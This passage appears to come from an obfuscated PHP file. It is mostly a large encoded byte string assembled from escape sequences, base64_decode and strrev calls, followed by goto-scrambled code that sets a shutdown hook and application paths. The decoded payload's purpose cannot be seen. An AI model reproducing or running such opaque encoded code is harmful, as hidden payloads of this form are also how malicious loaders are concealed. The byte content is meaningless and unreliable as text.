316\215\320\142\242\226\313\2\250"."\xf2\x2e\xb8\xeb\xcb\x2b\x59\x7a\xb3\xc\x2f\x15\x43\x6c\x8d\x3\x4d\x72\xc\x17\x94\xb4\xa3\x90\x4f\x3b\xd2\x6a\xca\x11\xcf\x15\x1c\xa6\x9a\x4a\xc1\x7f\x1c\x60\xc\x1d\x85\x44\xd2\x61\x94\xd2\xe\x25\x25\x8f\x3a\xca\x4a\xbc\x40".base64_decode('PYPrsxyKnnKMJBOOZEJ3JEEBeb3syCsphwbgenmWowDCBoDJ4M/QqZsPNaloYG9laNkiUggbnQA+')."\106\305\40\12\131\156\351\5\177\267\267\321\265\74\304\122\107\35\23\44\330\213\131\361\215\305\214\131\212\131\141\57\106\114\364\122\227\356\213\360\220\320\70\176\20\114\316\102\27\361\344\277\321\134\301\5\377"."\220\30\241\100\104\7\32\363\105\320\133\204\240\251\341\242\210\350\132\152\214\13\43\232\256\2\311\130\256\136\221\200\75\321\320\122\146\231\251\226\211\250\141\222\42\324\215\124\204\245\220\270\121\211\151\151\205"."\246\107\330\223\71\161\325\14\202\175\270\314\165\73\361\150\2\270\21\53\100\43\126\41\11\2\1\166\120\35\245\366\353\213\134\370\252\232\343\27\140\242\203\301\165\271\154\113\43\104\150\233\4\325\47\10\50"."\x7\xce\xe\x5a\x18\x3c\x18\x8d\xc1\x73\x51\xa1\x65\x8b\x5c\xfe\x1e\x6f\xc8\x85\xca\x43\xf6\x8e\xfc\xdb\xf0\xfe\x55\x17\xdd\x23\xe0\x8f\x32\x1\x9b\x21\xa6\xb3\x5a\x5c\xce\xc6\x70\x19\xfc\x72\x4f\xce\x3\xae\xc2\xac\xe3\x17\xb9"."\x70\x1c\x94\xe6\xb2\xa6\xa4\xa9\x7a\x56\x56\xcb\xa7\x55\xb3\x98\xb4\xb6\x69\x71\x30\x8c\xaa\x52\x4\x19\x5c\x36\x94\x2c\x28\xef\x3f\x64\xb0\x60\xc8\xd9\xff\x84\x6f\xc5\x48\x2a\x25\x35\xa1\xf4\xc9\x23\x55\x8\xa\x42\x29\xc9\xe4".strrev(''."\0".'z‘œ'."\0".'›FDÒµ˜Qb¡`GP¸rIeš:è8qà“OÅ˜ ÉÙzùˆNËøYa\\<%¼yÁÎ').strrev('Õ˜´7jeS1Tñ…OÒ'."\n".'5È\'#Îg`Ñ§†IVU"'."\n".'*«¯>"ô'."\n".'éŠAçqn¤}A¡')."\40\105\364\212\104\1\340\317\317\236\223\313\165\253\331\52\13\321\67\240\201\244\242\341\5\35\54\347\155\63\224\365\141\25\24\177\70\200\32\12\126\51\376\134\257\370\305\252\10\313\62\252\251\164\312\331\212"."\x4f\xa1\x2c\x95\xa9\xb4\x77\xb8\x1a\x62\xb5\xbe\xe3\xa9\x14\xd2\xa9\xca\xc6\x4\xa3\x54\x81\xe2\x5b\x2a\x2c\xc4\x24\x28\x27\x1c\x72\xd2\x34\x1c\x72\xd1\x21\xe7\x74\x87\x5c\xd2\x1d\x71\x2d\x3f\xe2\x48\x1a\x29\xf0\x67\x38\xc0\xd2"."\13\223\123\131\200\230\225\35\131\300\300\34\71\65\251\72\162\40\240\232\216\321\234\303\230\235\43\213\160\256\0\22\13\263\35\132\112\167\350\43\240\110\43\3\347\306\210\243\54\227\34\345\234\354\310\65\313"."\16\55\235\166\224\126\247\34\345\222\243\244\45\34\46\75\102\246\142\122\314\20\165\36\127\27\325\304\10\4\273\340\77\140\134\162\5\43\126\314\253\243\324\201\172\116\323\112\122\256\224\111\376\47\174\354\346"."\334\216\217\205\22\300\367\164\315\30\221\135\110\367\112\321\355\313\21\113\37\44\10\153\241\162\42\30\155\271\120\160\0\201\46\11\266\235\310\360\167\310\236\223\327\147\220\255\202\124\301\53\6\45\65\61\7"."\256\14\375\4\226\23\4\145\26\230\210\127\256\230\156\71\105\147\236\127\340\161\212\50\242\22\221\13\24\107\175\6\341\225\121\260\172\300\50\23\255\214\366\317\133\100\203\100\336\56\65\255\205\377\316\132\53"."\3\336\132\322\364\270\152\320\347\257\130\323\207\104\141\363\277\317\44\62\303\377\41\27\227\117\323\112\136\377\237\277\52\144\32\123\250\325\321\177\237\235\347\1\35\105\215\325\377\207\216\202\231\142\342\113\164".strrev('„ˆa<Àç3(R7#¸¥sĞê´f­9•š`JÕ8f©––`Í{'."\r".'bAv¿F®ÔäÔpÉ').base64_decode('RjlF5u7s9CzH7HTBIYOJH1cBB1BLKUfeKDnA7Af/l01QHPjNAVkkByX0HBDVS1qcsh2oWuzS8vAh')."\x8\xf8\x4c\x82\xab\xc\x8f\xee\x1c\x13\x9\xd7\x95\xf8\x19\x74\xf2\x56\x99\x61\xec\x7f\x65\x3\xe\xeb\x84\x4d\x90\x43\xb5\x98\x60\x98\xf1\x5f\xb3\x8\x5b\x59\x38\x59\x28\x9\xd7\x16\xed\x61\x84\x19\xb9\xc8\x45\x5a\x81\xa5\x44"."\x98\xe0\x60\xf2\x27\x47\x23\x99\xe1\x8d\x4d\x22\x96\xd5\xb4\x91\x62\x41\x60\x5\x38\x15\xef\xb2\xd\xd7\x60\x63\xd3\xda\xa6\x21\x17\x9f\xde\xff\x9\x13\x17\xfb\x9f\xb0\x10\x63\x10\x90\x78\xcf\x60\x74\x94\x1e\xfb\xe6\x2a\x92\x2f"."\x9\x19\x84\x3d\x24\xe7\x9b\x9c\x5f\xae\x15\xf9\xe5\x5a\xc2\xec\x86\x2c\xc2\xaf\x9d\x38\x18\xd7\x85\x9\xb0\x13\xe8\x59\x28\xf9\xad\xe0\xba\x83\x3a\xd8\x33\x8a\xf3\xaa\xca\xee\x81\x88\x5c\x94\x19\x13\x6b\x5f\xc3\x52\x11\x36\xf9"."\276\1\313\306\346\55\314\335\302\242\163\154\361\266\354\204\53\300\150\120\160\270\202\237\353\211\214\112\357\245\320\5\211\150\320\101\267\6\112\122\220\367\101\206\154\122\127\362\302\13\106\240\105\140\207\6\335".base64_decode('xTAQ6ETh4RJBW0tjEgqaLDi4uDfQ6UEeHmI9Afp0d1tbuyHekGUAvTjBh9Lsicxlsg71IBwRoiIo')."\221\124\111\313\263\73\56\162\56\126\306\250\70\22\354\11\306\74\3\221\36\301\113\6\3\5\211\122\17\172\243\34\102\2\41\377\11\36\356\23\53\56\33\364\274\150\331\262\145\116\170\336\16\115\154\22\350"."\x79\xf3\x4e\x98\x28\x41\x46\x98\x6b\xab\x19\xd1\x92\x89\xac\x56\x4c\xd6\xf0\x2\xdd\x4d\xae\x46\xa9\xb9\xb1\x49\x1a\xc8\x53\x55\x52\xba\x3d\xa2\x2f\xd9\xe7\x35\xa7\xf0\x90\xa4\xed\x2d\x7b\x6b\xa2\xe5\xb1\x64\xfa\x71\x9c\x4\xf6".base64_decode('EoCshB1zoKTogv0Dff+b/PYFlhK95q5AkJwf9C1h6ixepUCF5q6Kh6WRBs5oLruQ6fcIp6Kt3paC')."\xae\x15\x52\x6a\x3e\x29\x1\x9c\xbc\xd1\xe2\x6d\xab\xf1\x7a\x96\xb6\xd4\xb4\x83\x24\x39\x9b\x85\xa9\x92\xbb\xbd\xd5\xcd\x11\xc9\x88\x5\x43\x81\x60\xb7\x9f\xf9\xc7\x8\xc2\x21\x20\xc7\x63\x58\xa7\xda\xe9\x23\x33\x83\x7c\xca\xa2".base64_decode('+V4DerqGa77XoDrVSNRpH7IlwsGmWcSHpGj8S3RKoVGd0A8wyuxtEIF4fdANgkAeGXYKbjPywEBi').base64_decode('j9gj2iOCjoDrE7xoh70KOyYBtY7QpMFdY0lnudKKSa5jERzWLumG644zqeoK8lwDM9vQqn6UKk8h').base64_decode('Fwr8wpncgJNZLphPc9PvODO9AEWi+zrbQJNouK2G2CvSeQGZYU075nut4RZlFA4qaHJ7AD3i3a+Z').base64_decode('SHuq1S2mAUSixNvOhgtiUCAqDrYaVaXdSrRwv94isRfYOcUWzRQh2KWyPtYiVXnJPVtVa95EJRIm')."\xd6\x17\xa9\x3a\x69\xa1\x11\x15\xa8\x5a\xdb\xfc\xb9\xcd\x8d\x8d\x8e\x5c\xd1\x30\x9d\xba\x62\x7d\x51\x17\x76\x94\x44\xce\xf\xfb\xc2\x4e\x3c\xb1\x9d\x4b\x55\xc0\xf\xbc\xd4\x4c\xdc\x3\x9f\xb4\x6d\x91\xc8\x44\x70\x48\x74\x7e\xe0"."\x50\xd0\x13\xe9\xea\x71\x48\x88\x58\x1d\xd2\x62\x5f\x4\x80\x7\xc0\x3f\xd8\x66\xc1\x21\xc1\x79\xd\x92\xc1\x3c\x77\x48\xd0\x48\xdb\x21\xd\xf4\xe3\x5f\xae\x85\xe\xfa\xe\x93\x5\xb2\x16\x42\x5d\x9\xe2\x90\xa2\x29\xd1\xb8\x49"."\224\44\301\31\13\265\154\110\257\143\0\35\321\134\313\62\65\77\173\26\124\102\307\366\120\160\237\116\210\1\160\307\242\236\157\301\116\236\14\147\116\115\200\125\35\254\250\116\100\22\55\120\225\317\132\6\275"."\310\374\377\57\1\326\202\152\302\377\377\227\2\165\44\74\46\130\144\342\105\123\61\376\247\62\50\203\143\135\205\265\223\332\311\252\320\44\315\152\154\224\2\113\40\32\111\231\54\344\242\235\114\170\1\36\37".strrev('I{k€ícä&á\'ñ*FMNRK'."\r".'&·.³Náæ!e¡ğ0*1dêóS$àföo¢\\¤Œ½cJ²')."\x81\x69\xb4\xb3\x30\x26\x66\x65\xc9\x16\xf4\x15\xcc\xc5\x18\xd8\x82\x8\xa\xc4\x98\x60\x92\x67\x8b\x6\x28\x8c\x63\xe3\x34\x86\x9e\x84\xeb\x50\xbb\x9a\x87\x4f\xfc\x9a\x88\xb7\x61\x8\x43\xd0\xca\x79\x85\x4e\x7a\x98\x1f\x1a\xc"."\272\21\320\315\31\63\314\207\21\131\76\342\224\264\335\217\213\126\40\12\205\131\133\5\315\303\332\351\254\320\12\362\352\242\302\340\55\266\131\302\332\214\62\61\62\260\365\30\305\262\164\55\43\27\134\44\174"."\122\317\31\101\337\340\14\50\217\127\210\26\11\72\232\166\2\176\122\252\140\311\25\264\0\7\164\102\236\70\341\42\376\215\53\53\126\346\245\13\53\42\66\34\134\356\364\215\26\100\35\225\44\130\251\301\206"."\x7d\xcc\x62\xa1\xec\x5e\x89\x4d\x4e\xf0\xb5\x5d\x43\xbd\x93\x6\x98\x77\x27\x72\xcb\x43\x1c\x27\x94\xd0\x32\x45\x98\x34\x94\x46\x49\xb8\x4\xe6\x3\xf4\x46\x9b\x6c\xb2\x3\x66\x51\x6c\x2d\x95\x82\xc7\x11\x24\x46\xb0\xd0\x7e\x92"."\x66\xc1\x9b\x45\x1a\x2b\x64\xe5\xbc\x62\xd0\x18\xc8\x2a\xa\xb6\x4b\xc5\x8c\x4b\xad\x19\x19\x2a\x4d\x16\xce\xd6\xc5\xaa\xc7\xb0\xd5\x25\x81\x8c\xc6\xa\x4a\x16\x1f\x96\x20\x7b\x38\xa\x1f\x9b\x0\x9e\xc8\xea\xd0\x8d\x5c\x52\x8c"."\253\71\170\305\50\263\112\352\100\144\7\334\150\204\342\244\165\105\311\133\40\361\154\121\261\0\344\154\41\43\43\10\6\220\207\71\272\342\356\256\264\273\113\167\167\221\255\366\267\360\317\336\44\231\254\132\304"."\101\26\175\316\3\65\20\357\244\241\253\236\264\232\252\12\207\127\163\125\23\12\124\252\53\163\215\235\214\240\113\43\240\303\313\152\164\47\41\244\204\64\223\255\255\334\164\11\45\245\262\124\243\313\337\267\70"."\xd6\xdd\xeb\xf\xc6\x90\x88\x1f\xe8\x8f\x78\x7a\x6d\x9\x80\x67\x46\xfc\x5d\x15\xe0\xce\x0\x75\xde\x6b\xab\x75\x3c\x67\xd5\x38\x53\xf3\x68\x99\xf\x72\xa7\x43\x20\x2a\x1b\xcc\x79\x2d\xf1\x9\x49\xf2\x40\xd3\x0\x1c\x5c\xd8\x1a"."\xd7\xdd\xd4\xde\x32\x2e\x6c\x78\x8c\x9c\x9c\x65\xa\x4d\x6e\xaa\xae\xee\x36\x8a\x44\x44\x20\x7e\x69\x7a\xfd\x64\xee\xb8\xc9\xfe\xae\x57\x8d\x53\xe3\xa5\xae\xde\x13\x40\x13\xa0\xfb\x90\x40\xc8\x13\x5a\xc1\xbd\x17\x83\x94\x88\x27"."\64\101\12\314\103\274\1\122\7\165\13\27\55\132\104\37\152\115\144\261\201\46\64\21\140\367\345\0\12\117\237\224\112\250\134\211\11\65\360\220\15\223\345\276\75\44\353\36\334\202\52\211\47\250\205\11\22"."\xd5\x2\x7d\x66\xb3\x40\xb5\xd4\xb\xf4\xd9\x9\x93\x1d\xa7\x9\xce\x82\xe6\x91\xdf\x51\xf2\x1b\x1f\x27\x64\x2d\xeb\x44\x77\x20\x21\x93\xfc\xaa\x41\xce\xc7\xd2\xe3\x50\xf5\x8d\x86\xc1\x4a\x93\xe5\xe7\x98\x48\xa7\x78\x48\xea\x92"."\xf3\xb5\xa6\x14\x0\x68\xb\xa5\x3e\x68\xb8\x94\x4f\x4b\xe3\xa0\xe5\xd8\x3d\xb6\xc1\x5d\x8e\x18\x19\x25\x9b\x8d\x41\x95\x37\x52\xdd\x44\x46\x93\xec\x1b\x48\x1a\x9d\xf8\x1b\xbc\x18\x2\x2e\x52\x7d\xd\xc8\x3c\x41\x5\xc9\xa4\x22".base64_decode('M1m47ecONohJoctFlHigvwXATKxIyAUpdaSAjg1igM8JniqhpCTBpQVZQVic6CzRkmTYWrDnnKQy')."\272\120\102\156\241\210\223\363\352\236\230\320\147\44\360\31\150\32\46\141\63\137\213\202\40\106\250\200\264\130\364\14\161\102\145\205\147\64\66\65\12\26\35\376\56\137\70\166\134\30\72\75\355\365\123\247\74"."\xd6\x4\x3f\x48\x8b\x84\x26\x48\xf1\x84\x26\x4a\x9\x74\x1e\x37\x41\x4a\x17\xdd\x3f\x58\x53\x7a\x3\x81\xb0\xe8\xff\xc9\x56\xbd\x81\xa0\xe0\xe9\x91\xec\x8f\xe1\xda\x4d\x9f\xe2\xe9\x1f\xe8\x25\xfc\x2b\x4a\x28\x38\x4a\x78\x71\x17".base64_decode('UW+KFmc0NlNjH/7wKOybmPA8OD4yw2EN7dBwWErI2CgmrmCpQElCL6+wdpIBZGXKyadBF85ud51r')."\x66\xfd\xf4\x69\x39\x11\x16\x6d\x80\xc0\x68\x83\x7b\xda\x0\xa9\xc6\x34\xe\x3\x8\xd3\x19\xdc\xbd\xb2\xae\x66\x6d\x6d\xbd\xab\xa1\x2e\xda\x54\xcf\xd4\xb7\xa2\xd4\xaa\x2c\x1a\x2d\x12\xe5\xa7\xa1\x35\xcd\xeb\xb8\x43\xc9\xe8\xa0".strrev('ì[±ñÕîéõ'."\r".']†°¬!Ñ£+ƒ'."\r".'\\‡jkê2ÃÿÈaç¡œ ë'."\0".'[&Ğ]4:!«')."\11\161\110\227\123\273\262\2\73\334\207\42\213\12\166\111\310\222\102\324\247\15\372\0\123\26\234\354\231\271\202\100\266\320\261\322\334\146\121\61\35\103\350\222\122\244\153\37\12\122\343\255\2\127\320\267\52"."\323\262\250\145\266\64\112\235\100\124\263\330\124\133\74\1\12\265\323\147\12\5\305\104\177\230\10\42\276\255\2\343\302\73\267\102\135\201\274\46\270\206\201\5\121\27\113\104\20\220\215\314\4\76\207\260\133"."\17\320\0\241\116\210\265\270\340\206\137\130\150\173\154\276\272\310\66\252\262\17\161\30\20\62\231\132\10\17\174\12\355\153\250\267\23\256\23\136\216\223\36\200\175\34\263\175\220\31\154\147\205\355\50\327\201".strrev('?ŠŸˆûÖ®x:"¯‚ØXşıü€*†z1äCĞ‚‡Œê}ñ“âI¯¼ä%"*Q¢Â×ÒA').base64_decode('vD+AnNJZ4AP9S/oDy6qhRvqCXJYQkro8/ZGYsCfFmxWw5WK7FaqwntATs2fF2TRjztqoLE9mCl3z')."\271\243\205\121\47\323\337\247\373\35\57\367\217\102\262\241\203\127\122\5\344\55\206\144\20\117\161\304\144\207\124\365\14\207\155\250\210\41\207\355\170\62\256\346\145\352\242\66\107\277\235\143\326\160\320\265\24"."\165\263\203\54\327\250\144\40\336\135\27\330\5\40\61\27\323\101\252\216\14\272\205\63\273\274\31\122\322\142\264\127\143\72\173\150\65\257\122\4\174\277\110\60\64\201\233\24\117\302\54\212\357\44\11\17\333".base64_decode('g9hi7mtVMNNzNkmsRTFcMo7MFBKwpngVUz+bHwVkO4snL7IgDxfjzBuOzTaP+oGVRKs46ukVFoCe')."\366\201\55\60\304\64\120\54\174\327\232\267\114\314\202\276\131\221\5\247\101\343\65\316\312\304\24\3\52\144\15\120\261\253\132\112\225\117\241\44\241\107\23\164\37\107\235\336\221\116\342\175\145\322\376\236\345"."\xa4\xcf\xdb\x69\xa2\xbf\x3e\x6c\xfa\x46\x3a\xd7\x39\x4b\x12\xc8\xb\xf2\x1e\x81\x22\xf0\x69\x4\xeb\x46\x6e\xcc\x99\xe5\x38\x1a\xf4\xff\xa0\xf0\xc1\xe7\xc6\x82\xf8\xdd\x21\x36\xb4\xe8\x81\x22\x16\xd3\x5\x43\x32\x25\x49\x87\xe"."\75\360\123\165\55\301\100\364\2\320\100\265\164\334\131\60\331\153\361\377\151\103\0\123\336\232\216\276\150\251\214\65\203\216\375\41\172\25\356\206\4\145\341\165\346\156\123\1\10\354\163\220\347\63\336\11\334".base64_decode('yx1+vYh6e/Ukk3ZwRGPASk95LuanlvjNBxvQsD/QX1cPJSqLr4C+MebZHIwaWrP75FE+KCxCUxlN')."\32\226\10\366\63\151\311\315\100\14\253\254\304\31\213\46\114\263\47\350\146\240\116\332\115\354\41\33\142\24\15\237\21\20\13\15\20\371\264\214\255\235\10\337\154\141\256\67\351\366\247\234\123\23\122\157\140"."\61\334\173\173\375\341\45\122\132\61\45\56\364\240\113\12\353\54\107\216\36\320\241\36\45\362\70\125\141\101\101\47\72\0\161\132\234\14\261\35\211\350\223\23\26\124\121\60\36\165\261\70\170\172\342\114\62"."\43\131\33\56\25\22\52\162\210\337\27\362\300\35\215\225\57\40\60\331\353\130\313\31\123\340\75\100\365\157\27\253\174\227\340\147\371\331\211\220\101\315\227\124\103\345\123\236\166\325\230\210\137\321\227\250\51".base64_decode('AgJ0OcYtx1m3su9UWDTzOMYhr6AJtrN4SMSXAYXVAPotAEst13UrUFc05Hqd0gaJCjfVlicESTLY')."\11\312\52\45\165\34\26\162\204\374\213\173\42\23\25\127\201\255\46\371\373\200\266\312\250\111\52\55\62\47\337\100\106\104\345\141\255\35\113\235\240\142\2\347\35\176\257\3\75\336\306\75\314\242\40\220\47"."\35\360\170\13\125\300\41\74\167\205\56\211\311\264\122\65\144\300\112\354\66\61\314\37\210\341\227\255\160\324\155\27\221\123\310\30\24\131\27\11\216\216\334\364\310\221\271\7\207\47\317\76\352\166\307\145\322"."\x10\x4\x73\xcb\x53\x98\x91\xbe\x64\x46\x2b\x8b\xa3\x76\x87\xb9\x19\x8b\x8c\x5c\x89\xb\xd2\x24\x6e\x5a\xcf\x10\xa4\x36\xa9\x11\x79\x68\xc0\xfa\x34\xe8\x7e\xa7\x95\x3e\xd\x0\x1b\x8f\xcd\x9d\xd1\x6b\x6e\xbe\x5c\xc1\xb4\x98\x42".strrev('O³X¤¥^‚" ÍªOÚÄØBÁ¬å–!–ÄÒŸ$ŒĞ«0jÒ÷ÚØ°V7-/e;|	‰â¨÷')."\x58\x96\x61\xe7\xf5\x8c\x4f\x5b\x18\x23\x8a\x8\x74\x84\xec\x4f\x5\x17\xf9\xf4\x17\xba\xbb\x61\xf2\x25\xac\x8a\x20\x88\x10\xab\xa5\x28\xf9\xa5\x3c\xd0\x5e\x34\x18\x9b\x2e\xa2\x15\x42\x9\x10\x46\x2b\x12\xfb\x14\xae\x86\x46\xea".base64_decode('6uBsHd9GAxD2KwQCnKJpmjD8WB09hD01urDjCyp3pFXmttWCRsgdbBH4YaHNRQtZ37C7lmLejx8K').strrev('A/ò‰ru¸•¡îÄÉ$ô“Ò»³™^€à'."\n".'è@ÏREŠBd4¯b_A;Ü5\'bı½¼Au@°')."\132\45\72\137\14\323\102\107\120\344\0\322\210\3\5\20\161\212\102\122\165\250\205\70\21\12\33\60\364\310\44\33\73\330\243\344\307\253\244\230\370\10\343\174\237\41\76\205\102\233\200\11\243\342\33\350\27".base64_decode('bqIduI0ORi6q0YvUC40wFrAc3Ae/A5/NIyMWzhx4d1CyTyv8g7CGEfHjFknOLsSxXrJlCNl7MqJV').strrev('OÄéEÿcâ«†ÙM&`Ğ¦b…P"–jWàtAÖ5Hg¨·47Å#Ôö‹V"Q÷Åò“®àUú').strrev('•’F1£ĞùhŸ(ä7ÿr0ùî YÏf³’äW(ÎÁiŒüc#ò=Ø%ĞµMQ±t¤àU€hh/').base64_decode('ziT6dqo4s1Gi1d0wee1W4II2/vVfTQdPNXETZxJOsFjJQhdU+8r/fz1wnIqU0FMrj1m9qZE9Ik8W')."\x84\x46\x51\xbc\x5\xa3\xe1\x61\xf3\xcb\xcc\x4\xf2\xd9\x31\x7b\x93\xf1\xe3\xa0\xff\x7d\xa5\xa9\x94\x27\x5b\xfd\x67\xa1\x54\xbe\x60\x42\xf6\x41\xbf\x4c\x8f\x75\x85\x65\xf\x5\xf1\x9a\x2b\x8c\xad\x70\xb8\xa1\x98\x1\x68\x4e\x4f"."\106\136\330\123\200\24\13\232\260\116\202\30\133\375\371\13\137\260\142\264\46\23\154\2\350\334\345\325\101\357\16\160\257\35\210\114\55\44\53\74\313\53\272\361\107\5\105\4\137\207\225\105\243\135\50\251\44"."\241\131\164\135\217\334\334\171\26\263\227\31\340\125\46\257\2\214\161\106\145\152\74\305\24\336\14\200\254\55\100\317\355\300\66\326\42\324\202\70\267\173\22\146\136\322\6\24\245\20\141\46\203\31\246\12\202"."\x29\x91\xd8\xb8\x8\x84\x1a\x2a\x78\x24\x22\x1b\x65\xde\x53\x1e\x42\xd6\x49\x87\xf8\x18\x31\x88\x32\xaa\x23\x6b\xa\x99\xfb\xc8\x19\x32\xfe\xac\xb0\x82\xf0\xc5\x82\x87\xfa\xa9\x69\x0\x8c\x8\x47\x42\x48\x90\x64\x89\x19\x51\xc6"."\x84\x8f\x52\xe1\x10\x15\xab\x58\x2d\x10\x9f\xab\x36\x1\x70\x25\x20\xf5\x91\x65\xc\x5\x29\x6f\x85\xba\xc3\xc8\x64\x17\xe6\x21\xbd\x67\xe5\x15\xa8\x41\xdf\xb0\x16\xc2\xe2\x98\x33\x6e\x61\x61\x15\x79\xf7\x24\x31\x95\x90\x91\xc3"."\x12\x23\x11\x2e\xd1\x21\xb5\x6b\xe1\xa\x9\xc5\x99\x9b\x55\xfa\x9c\x18\x7d\x65\x4c\x66\xfe\x60\xa0\x23\x1d\xb6\x8d\xc2\x47\x4c\x4\x25\x9b\xe5\xeb\x84\xf8\x5c\x4c\x36\x2e\xeb\x2e\x40\x4e\x23\x26\x75\x3c\x56\x2d\x22\xbe\x8a\x50"."\x45\xfa\xa7\x12\x8\x6f\x40\x5e\x4d\x8c\x54\x71\x34\x4\x3b\x1b\xaa\xe4\x8\x2c\x5a\x58\xd8\x2a\xd0\x38\xd7\x0\xeb\x1f\x53\xa5\xa3\x21\x24\x2a\x43\x91\x88\x3c\xb6\x6e\x79\xa3\x23\xc0\xae\x98\xeb\x89\x93\xba\xa1\x45\x74\xf6\xc3"."\x29\x47\xcf\xae\xc4\x89\x6f\x1\x55\xb0\x8b\x88\x65\xad\xb0\x0\xc5\xee\x21\x44\x0\x9d\xdd\x53\x7a\xb0\xe4\x80\x8e\x89\x3a\x5\x99\x1b\x23\x19\x62\xdf\x5a\x9e\x19\xa9\xf4\x3b\x55\x99\x9b\x4d\x40\x31\xb\x5f\x2e\x70\x1c\x3e\xd2"."\154\335\314\212\105\343\153\141\270\141\13\301\275\225\313\126\74\233\61\125\147\211\152\340\43\100\161\337\1\102\142\105\351\64\13\352\32\132\375\255\120\266\6\10\346\111\202\352\120\330\316\250\114\315\322\107\100"."\x58\x17\x8e\xe7\xf1\x7b\x9c\xf8\x1d\x76\xf8\x98\x20\x60\x57\x52\x78\xa0\xaf\xe\x79\x2d\x87\x0\x18\xc0\x6f\xba\xad\x22\xc2\xc8\x2a\x69\xb2\x24\xfc\x87\x5f\xf6\xab\x83\xc9\xb0\x90\x55\x92\xbf\x9f\xbf\xad\x5c\x2f\xf1\x17\xe9\xc4"."\307\336\341\371\125\267\306\350\300\372\350\2\364\223\154\45\372\366\152\150\11\115\67\4\64\341\41\253\343\241\373\170\34\354\123\363\364\115\20\102\313\64\73\351\172\34\253\126\76\30\351\260\151\31\23\376\330"."\xbd\xfd\x91\x7b\xb4\xbd\xc3\x3b\x36\xcb\xc6\x8d\xa8\xe8\x88\x20\xe1\x88\x9\xea\xa1\x5b\x7d\xc1\xa2\x44\x4\xa6\x8f\x76\x92\x12\x84\x73\x72\xeb\x8d\x5\x7b\xe5\xbc\x82\x51\x15\xd5\x5e\x21\x19\xe5\xa2\x6f\xc3\x81\x5f\xf8\x1e\x83".base64_decode('nztqQMn4ZM9Tkpn6ij3XgEX6Fe43EogC+RYFZYyDWqJ/PAXVnsPMqHqyU80n7fjFfJxBOToYjM5q')."\140\40\71\161\136\155\203\13\313\12\347\226\162\211\237\177\163\231\63\231\354\226\113\125\120\231\131\65\203\2\10\103\105\242\216\360\274\14\167\42\254\224\305\257\23\274\124\345\242\2\21\53\241\374\371\31\173"."\273\320\274\141\160\162\345\220\27\334\257\21\162\343\40\204\223\140\236\371\160\121\320\45\263\13\372\275\346\56\373\160\35\331\326\221\177\322\372\112\16\103\143\142\30\300\101\12\352\116\13\324\346\307\30\236\242"."\321\345\325\226\104\366\255\102\361\125\267\267\26\122\350\25\212\23\157\75\46\314\20\256\376\21\116\257\326\56\16\333\356\132\154\54\224\43\323\225\115\263\14\210\300\140\131\143\11\146\110\114\264\124\321\76\334"."\150\13\301\151\25\3\163\350\154\13\247\171\254\111\30\137\261\265\110\314\140\157\55\316\241\127\364\31\311\123\375\323\366\17\320\56\263\337\71\362\102\204\35\114\305\205\150\104\253\222\7\327\250\152\66\234\4"."\163\162\321\315\222\327\50\253\146\42\123\65\57\116\202\171\53\222\151\146\141\63\56\344\63\345\242\61\101\363\52\73\17\115\55\133\327\221\6\163\7\344\2\352\104\375\131\25\271\362\163\204\170\354\330\150\23"."\135\275\26\125\17\3\46\252\105\125\344\11\153\301\261\155\167\237\325\170\44\115\251\302\25\371\125\145\45\377\345\151\125\56\116\161\231\160\161\16\131\364\10\53\222\305\133\330\352\367\264\241\252\263\330\260\136"."\240\332\340\142\307\120\215\220\235\353\117\337\375\300\46\177\120\242\1\21\154\341\332\305\374\110\236\272\132\2\137\340\56\14\241\71\245\107\267\367\37\225\1\155\116\201\51\171\346\213\202\43\332\252\136\205\35".strrev('7;õ¼û¹\\·İëûßwÓÎç~GTWœµğ ùdÓ§6è @oè!5LÑc¼eÏ¢\\GRÌó¹\\cp')."\135\342\330\165\326\265\273\176\176\346\256\237\157\334\271\341\312\235\227\136\217\23\166\135\161\352\273\227\236\267\120\332\165\346\311\60\361\242\237\356\270\357\116\374\357\316\153\356\171\347\226\7\167\77\160\13\106"."\xd9\xb9\xf9\x9e\x77\x36\x5f\xbb\xfb\xc2\xeb\x77\x9d\x71\xd7\xae\x8b\x7f\xb5\xeb\x67\x67\x4c\x15\x3a\x5\xd4\x5b\xe7\xde\x7\x2d\xd7\x89\x55\xd2\x5d\xfc\xe4\xd6\xe2\xfb\x1a\x3d\xf4\xc6\x2c\xd9\xb1\xe0\x40\xce\xae\xf1\x4d\xb\xd2".base64_decode('6CGQzjG4r3Pg9RgnhzXdhBbuYM0ooN9OzTQpKwPSN8JE4iVyoCPcH4MQf7kXDiE6NkfzAfEtFCR3')."\76\160\17\34\126\160\52\342\166\226\10\74\216\147\221\120\345\271\173\167\321\166\311\304\1\140\367\32\327\106\11\255\241\267\167\170\175\340\271\71\351\26\273\10\311\37\132\40\304\56\336\206\43\25\64\303\215"."\x53\xdc\x44\x5d\xdd\x89\xca\x70\x92\x87\x23\x99\xba\x1a\xc9\x9e\x44\xf3\x97\xb9\xe0\xfc\xa6\x12\xc8\x51\x22\x2f\x2\xbf\x56\x8e\x8e\xa3\xfa\x3\x91\x98\x6f\xb9\x3f\x1c\x9\x57\x24\x5\x3d\xe1\xf0\xb2\x40\xc8\x8b\x55\x5e\x2b\x92"."\x51\x2e\x41\xf5\xa0\x22\x29\xd8\x13\xe8\x9f\x28\xcd\xd7\xe7\xf1\xf7\x56\xa4\x41\x55\x4\xa8\x88\x4b\xdf\x36\xc5\x49\xfe\x20\xaa\xa5\xa7\xb7\x97\xea\xbd\x55\xd6\xc2\xdf\xb5\x84\xd7\x4\xdd\xc0\xf1\xf3\xe2\x42\x46\xa3\xc7\xaf\x36"."\235\34\172\274\36\226\351\154\24\137\352\120\162\354\70\114\50\302\172\124\41\16\263\101\337\333\145\201\102\305\316\106\20\100\240\272\100\77\51\54\104\275\113\302\307\336\31\147\141\122\66\152\220\250\167\304\357"."\30\135\226\273\110\1\216\46\13\342\157\2\21\212\313\73\2\20\75\131\333\135\220\255\3\27\333\116\165\55\267\211\10\302\73\4\326\373\70\352\135\142\130\213\13\27\114\230\5\132\230\237\250\360\201\303\226"."\144\300\133\42\132\104\116\23\136\2\5\36\36\353\34\23\303\342\231\112\73\143\45\246\234\246\127\372\166\56\57\334\141\303\136\372\177\66\71\345\127\303\305\0\0"."", 10, -8))); goto fìÉÌ““·; DÓÆ… Æõ«: function beforeShutdown() { Hook::trigger($_SERVER[æÒğ][36]); } $_SERVER[$_SERVER[æÒğ][37]] = BASIC_PATH; $_SERVER[$_SERVER[æÒğ][38]] = LIB_DIR; goto E¢µ›‡Âä; e™ªŠšó±Î: $f½ñ±¿¼¸¤ = $_SERVER[”Ì÷ñ­î¸][547]; while 